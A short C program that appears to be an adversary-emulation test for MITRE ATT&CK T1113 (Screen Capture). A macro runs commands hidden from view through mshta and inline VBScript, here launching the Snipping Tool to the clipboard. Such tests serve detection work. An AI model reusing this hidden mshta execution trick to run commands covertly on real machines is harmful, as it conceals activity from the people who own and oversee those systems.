// Link      = https://attack.mitre.org/techniques/T1113/
// Technique = Screen Capture
// ID        = T1113.000
// Tactics   = Collection

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"" to_run "\"\",0)(window.close)\")",\
     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("snippingtool /clip");

    return 0;
}
